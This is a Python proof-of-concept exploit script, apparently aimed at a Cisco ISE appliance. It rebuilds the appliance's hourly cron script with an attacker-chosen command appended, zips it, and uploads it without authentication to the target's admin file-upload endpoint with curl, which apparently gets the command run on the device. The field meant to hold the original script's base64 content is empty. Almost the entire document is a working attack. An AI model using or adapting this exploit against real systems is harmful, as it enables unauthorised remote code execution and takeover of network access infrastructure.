import os
import base64
import zipfile
import subprocess
import argparse


parser = argparse.ArgumentParser(description="PoC with --reset flag to toggle behavior.")
parser.add_argument('--reset', action='store_true', help='Trigger reset behavior')
parser.add_argument('--command', type=str, required=True, help='Command to be executed')
parser.add_argument('--ip', type=str, required=True, help='Target IP address')
args = parser.parse_args()

# Setup necessary info
COMMAND = args.command
IP = args.ip

#Original file under /opt/CSCOcpm/bin/ named isehourlycron.sh
isehourlycron = ""


decoded_data = base64.b64decode(isehourlycron).decode("utf-8")

# Ensure the bin directory exists
os.makedirs("bin", exist_ok=True)

#Write decoded data to a file
file_path = "bin/isehourlycron.sh"
with open(file_path, "w") as f:
    f.write(decoded_data)
    # Reset or not ?
    if args.reset:
        print("File has been reset")
    else:
        f.write(COMMAND)  # Step 3



# Zip the bin/ folder
zip_file = "output.zip"
with zipfile.ZipFile(zip_file, "w", zipfile.ZIP_DEFLATED) as zipf:
    for root, _, files in os.walk("bin"):
        for file in files:
            full_path = os.path.join(root, file)
            arcname = os.path.relpath(full_path, start=".")
            zipf.write(full_path, arcname)

# Upload using curl
print('Upload the file unauthenticated')
curl_command = [
    "curl",
    "-F", f"file=@{zip_file}",
    "https://"+IP+"/admin/files-upload/",
    "-k"
]
subprocess.run(curl_command)
